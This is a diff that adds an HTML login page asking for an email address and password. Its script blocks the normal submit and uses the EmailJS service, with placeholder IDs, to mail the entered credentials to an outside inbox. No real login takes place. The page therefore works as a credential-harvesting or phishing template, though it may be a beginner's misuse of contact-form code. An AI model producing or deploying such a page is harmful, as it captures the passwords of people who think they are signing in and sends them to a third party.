@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" 
+    content="width=device-width,
+    initial-scale=1.0,
+    maximum-scale=1.0,
+    user-scalable=no">
+    <title>login page</title>
+</head>
+<body>
+    <section>
+        <div class="container">
+            <h1>Login</h1>
+            <!-- Remember action -->
+            <form action="test.php" method="post" id="contact-form" target="_blank" >
+                <div class="email">
+                    <ion-icon class="ion-icon-email" name="mail-outline"></ion-icon>
+                    <input type="email" name="email" placeholder="Email" required>
+                </div>
+                <div class="password">
+                    <ion-icon class="ion-icon-password" name="lock-closed-outline"></ion-icon>
+                    <input type="password" name="password" placeholder="password" required>
+                </div>
+                <div class="check-box">
+                    <input type="checkbox" name="check-box">
+                    <label>i agree to all terms</label>
+                </div>
+                    <button>Login</button>
+            </form>  
+            <!-- Don't forget to put the link in href  -->
+            <p>Don't have a account <a href="#">Register</a></p>
+        </div>
+    </section>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("YOUR_USER_ID"); // ضع معرف المستخدم الخاص بك هنا
+        })();
+    
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع إرسال الفورم بالطريقة الافتراضية
+    
+            emailjs.sendForm('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', this)
+                .then(function() {
+                    alert('Message sent!');
+                }, function(error) {
+                    alert('Failed to send message: ' + error);
+                });
+        });
+    </script></body>
+</html>
